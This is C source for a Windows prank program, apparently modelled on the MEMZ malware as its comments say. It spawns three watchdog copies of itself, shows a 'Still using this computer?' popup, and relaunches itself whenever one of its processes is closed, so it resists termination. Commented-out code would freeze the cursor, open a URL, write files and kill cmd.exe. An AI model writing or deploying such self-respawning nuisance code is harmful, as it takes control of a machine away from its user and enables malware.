#include "utils.h"

#define ARG L"monitorproc"

DWORD WINAPI monitorT(LPVOID p);

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {

	int argc;
	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
	

	if (argc > 1 && !lstrcmpW(argv[1], ARG)) {

		CreateThread(NULL, NULL, &monitorT, NULL, 0, NULL);
	}
	else {

		LPWSTR procn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * 2);
		GetModuleFileName(NULL, procn, MAX_PATH * 2);

		for (UINT8 i = 0; i < 3; i++) {
			ShellExecuteW(NULL, NULL, procn, ARG, NULL, SW_SHOWDEFAULT);
		}
		
		popup("lol", "Still using this computer?\n");
	}
	
	//while (popup("lol", "Still using this computer?\n") == IDYES) {}
	//HANDLE lightsT = CreateThread(NULL, NULL, &FlashLEDs, NULL, 0, NULL);
	

	//createNote(".\\note.txt", "WOowoowowooOOWoWOo", TRUE);
	

	//makeSearch("https://www.youtube.com/watch?v=T5y_OcKDadQ");

	//freezeCursor(15);

	

	while (true);
	return 0;
}

DWORD WINAPI monitorT(LPVOID p) {

	size_t prevProcAmount = 0;
	size_t procAmount = 0;
	
	LPWSTR iprocn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 512);			// Get the current process's name
	GetProcessImageFileNameW(GetCurrentProcess(), iprocn, 512);
	iprocn = getImagNameW(iprocn);

	HANDLE cproc;
	char* cprocn = NULL;

	delay(1000);

	/* "Inspired" by MEMZ, a way to monitor all running processes under the same name */
	while (true) {

		HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);	// Get all current running processes

		PROCESSENTRY32 entry;
		entry.dwSize = sizeof(entry);

		Process32First(snap, &entry);
 
		procAmount = 0;

		do {

			cproc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, entry.th32ProcessID);

			/*if (!lstrcmpW(L"cmd.exe", entry.szExeFile)) {
				
				TerminateProcess(cproc, 0);
			}*/

			if (!lstrcmpW(iprocn, entry.szExeFile)) {
				procAmount++;
			}

			CloseHandle(cproc);
			LocalFree(cprocn);

		} while (Process32Next(snap, &entry));

		CloseHandle(snap);		// Snapshot will change each time a process is being created, make sure it is updated

		if (procAmount < prevProcAmount) {
			LPWSTR procn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * 2);
			GetModuleFileName(NULL, procn, MAX_PATH * 2);
			ShellExecuteW(NULL, NULL, procn, ARG, NULL, SW_SHOWDEFAULT);
			LocalFree(procn);
			return 1;
		}

		prevProcAmount = procAmount;
	}


}